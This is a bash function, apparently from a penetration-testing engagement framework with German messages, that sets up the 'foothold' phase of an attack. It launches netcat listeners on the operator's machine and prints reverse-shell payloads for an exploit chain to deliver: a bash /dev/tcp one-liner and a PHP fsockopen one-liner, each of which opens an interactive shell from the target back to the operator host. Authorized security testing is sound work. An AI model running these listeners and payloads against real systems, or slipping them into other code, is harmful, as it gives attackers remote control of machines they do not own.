# shellcheck shell=bash
# Phase 40 — foothold: interactive reverse channel back to the operator host.
# Spawns the listener in its own terminal (auto: tmux pane / OS window / nohup),
# then prints the payload the exploit chain should deliver.
# Requires ENGAGE_LHOST (operator-reachable IP) and ENGAGE_LPORT.
phase_foothold() {
  state_done 40 && { echo "[40] foothold ✓ (skip)"; return 0; }
  local lhost="${ENGAGE_LHOST:?ENGAGE_LHOST setzen (Operator-IP, vom Ziel erreichbar)}"
  local lport="${ENGAGE_LPORT:-4444}"
  local sid="p2s-$ENGAGE_SID"

  local jobs=(
    "listener|echo '[listener] warte auf Rückkanal auf $lhost:$lport'; nc -lvnp $lport"
  )
  if [[ "${ENGAGE_RS:-}" == "on" ]]; then
    local rsport="${ENGAGE_RS_PORT:-4445}"
    jobs+=("rs-listener-$rsport|echo '[rs] lukechilds-Varianten — Listener $rsport'; nc -lvnp $rsport")
    state_set 40 RS_PORT "$rsport"
  fi
  term_spawn_jobs "$sid" "$ENGAGE_DIR/logs" "${jobs[@]}"

  state_set 40 LISTEN_HOST "$lhost"
  state_set 40 LISTEN_PORT "$lport"
  state_set 40 TERM_SESSION "$sid"
  state_mark 40

  cat <<EOF
[40] foothold ✓ Listener läuft (Session: $sid, Port $lport)

Payload für den Exploit-Kanal (Beispiele, auf Ziel-OS anpassen):
  bash:  bash -i >& /dev/tcp/$lhost/$lport 0>&1
  php:   php -r '\$s=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'

Varianten-Generator (Repo): reverse_shell via tools — siehe pentest-kb / lukechilds-Pfad.
Menü: [e] → [7] Reverse-Shell-Varianten (Payload-Beispiele + weiterer Listener).
EOF
}
